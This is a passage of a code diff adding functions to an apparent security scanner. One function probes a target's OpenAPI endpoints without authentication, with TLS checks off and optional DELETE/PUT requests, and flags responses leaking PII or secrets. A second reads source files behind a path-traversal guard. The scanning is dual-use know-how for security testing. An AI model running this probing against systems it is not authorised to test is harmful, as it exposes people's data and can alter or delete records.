+                autoswagger_bin = candidate
+                break
+
+    if autoswagger_bin:
+        cmd = ["python3", autoswagger_bin, target_url, "-json", "-stats"]
+        if risk:
+            cmd.append("-risk")
+        if all_codes:
+            cmd.append("-all")
+        if brute:
+            cmd.append("-b")
+        if rate != 30:
+            cmd.extend(["-rate", str(rate)])
+
+        try:
+            logger.info(f"autoswagger: running {' '.join(cmd)}")
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
+            raw = (result.stdout or "").strip()
+            if raw:
+                try:
+                    data = json.loads(raw)
+                    endpoints_tested = data.get("results", [])
+                    stats = data.get("stats", {})
+                    findings: List[Dict] = []
+                    for ep in endpoints_tested:
+                        pii = ep.get("pii", [])
+                        secrets = ep.get("secrets", [])
+                        if pii or secrets or ep.get("flagged"):
+                            severity = "high" if secrets else "medium"
+                            desc = (
+                                f"Unauthenticated endpoint {ep.get('method','GET')} {ep.get('url','')} "
+                                f"returned HTTP {ep.get('status_code','?')} with "
+                                + (f"PII: {pii}" if pii else "")
+                                + (f" Secrets: {secrets}" if secrets else "")
+                            )
+                            findings.append({
+                                "url": ep.get("url", ""),
+                                "method": ep.get("method", "GET"),
+                                "status": ep.get("status_code"),
+                                "pii": pii,
+                                "secrets": secrets,
+                                "severity": severity,
+                            })
+                            bridge.submit_finding(Finding(
+                                host=host,
+                                title=f"API Data Exposure: {ep.get('method','GET')} {ep.get('url','')}",
+                                description=desc,
+                                severity=severity,
+                                tool="autoswagger",
+                                url=ep.get("url", ""),
+                            ))
+                    bridge.flush()
+                    return {
+                        "success": True,
+                        "tool": "autoswagger_cli",
+                        "target": target_url,
+                        "endpoints_tested": len(endpoints_tested),
+                        "flagged_endpoints": findings,
+                        "stats": stats,
+                    }
+                except json.JSONDecodeError:
+                    pass
+            logger.warning(f"autoswagger: no JSON output; stderr={result.stderr[:500]}")
+        except subprocess.TimeoutExpired:
+            logger.warning("autoswagger: subprocess timed out")
+        except Exception as e:
+            logger.error(f"autoswagger subprocess error: {e}")
+
+    # Native fallback — discover the spec then probe each endpoint
+    logger.info("autoswagger: falling back to native httpx endpoint tester")
+    discovery = run_swagger_spec_discovery(target_url, bridge, timeout=min(timeout, 60))
+    if not discovery.get("specs"):
+        return {
+            "success": False,
+            "tool": "native_fallback",
+            "error": "No OpenAPI/Swagger spec found — install autoswagger for spec-less testing",
+            "discovery": discovery,
+        }
+
+    spec_urls = discovery.get("spec_urls", [])
+    all_documented_endpoints = discovery.get("endpoints", [])
+    tested: List[Dict] = []
+    flagged: List[Dict] = []
+
+    http_methods_to_test = ["GET"]
+    if risk:
+        http_methods_to_test += ["POST", "PUT", "PATCH", "DELETE"]
+
+    with httpx.Client(
+        headers={"User-Agent": "AegisVanguard-AutoSwagger/1.0"},
+        verify=False,
+        timeout=15,
+        follow_redirects=True,
+    ) as client:
+        for ep in all_documented_endpoints:
+            method = ep.get("method", "GET")
+            if method not in http_methods_to_test:
+                continue
+            full_path = ep.get("full_path") or ep.get("path", "")
+            url = base_origin + full_path
+            try:
+                resp = client.request(method, url)
+                status = resp.status_code
+                body = resp.text[:10000]
+                ct = resp.headers.get("content-type", "")
+
+                # Skip auth-gated responses unless all_codes requested
+                if not all_codes and status in (401, 403):
+                    tested.append({"url": url, "method": method, "status": status, "skipped": True})
+                    continue
+
+                data_hits = _scan_response_for_pii_and_secrets(body)
+                is_large = len(body) > 5000 and "json" in ct.lower()
+
+                entry: Dict[str, Any] = {
+                    "url": url,
+                    "method": method,
+                    "status": status,
+                    "content_type": ct,
+                    "response_size": len(body),
+                    "pii": {k: v for k, v in data_hits.items() if k.startswith("pii:")},
+                    "secrets": {k: v for k, v in data_hits.items() if k.startswith("secret:")},
+                    "large_response": is_large,
+                    "operation": ep.get("operation_id", ""),
+                    "summary": ep.get("summary", ""),
+                }
+                tested.append(entry)
+
+                if entry["pii"] or entry["secrets"] or (is_large and 200 <= status < 300):
+                    severity = "high" if entry["secrets"] else ("medium" if entry["pii"] else "low")
+                    flagged.append(entry)
+                    desc_parts = [f"Endpoint {method} {url} (HTTP {status}) returned data of interest:"]
+                    if entry["pii"]:
+                        desc_parts.append(f"  PII: {list(entry['pii'].keys())}")
+                    if entry["secrets"]:
+                        desc_parts.append(f"  Secrets: {list(entry['secrets'].keys())}")
+                    if is_large:
+                        desc_parts.append(f"  Large JSON response ({len(body)} bytes) — potential bulk data exposure")
+                    bridge.submit_finding(Finding(
+                        host=host,
+                        title=f"API Data Exposure: {method} {full_path}",
+                        description="\n".join(desc_parts),
+                        severity=severity,
+                        tool="autoswagger_native",
+                        url=url,
+                    ))
+            except Exception as exc:
+                tested.append({"url": url, "method": method, "error": str(exc)})
+
+    bridge.flush()
+    return {
+        "success": True,
+        "tool": "native_fallback",
+        "target": target_url,
+        "spec_urls": spec_urls,
+        "endpoints_documented": len(all_documented_endpoints),
+        "endpoints_tested": len(tested),
+        "flagged_count": len(flagged),
+        "flagged_endpoints": flagged,
+        "all_results": tested,
+    }
+
+
+def read_source_file(
+    path: str,
+    start_line: int = 1,
+    num_lines: int = 30,
+    source_dir: Optional[str] = None,
+) -> Dict[str, Any]:
+    """Read lines from a source file with bounds checking."""
+    # Resolve path — may be relative to source_dir or absolute
+    if source_dir and not os.path.isabs(path):
+        full_path = os.path.realpath(os.path.join(source_dir, path))
+        # Jail to source_dir to prevent path traversal
+        real_source = os.path.realpath(source_dir)
+        if not full_path.startswith(real_source):
+            return {"error": "Path traversal outside source_dir denied"}
+    else:
+        full_path = os.path.realpath(path)
+
+    if not os.path.isfile(full_path):
+        return {"error": f"File not found: {path}"}
+    if os.path.getsize(full_path) > 5 * 1024 * 1024:
+        return {"error": "File too large (> 5 MB). Use grep_source for targeted searches."}
+
+    try:
+        with open(full_path, "r", errors="ignore") as fh:
+            all_lines = fh.readlines()
+    except Exception as exc:
+        return {"error": str(exc)}
+
+    total = len(all_lines)
+    start = max(1, start_line)
+    end = min(total, start + num_lines - 1)
+    selected = all_lines[start - 1: end]
+
+    return {
+        "path": path,
+        "total_lines": total,
+        "start_line": start,
+        "end_line": end,
+        "content": "".join(selected),
+    }
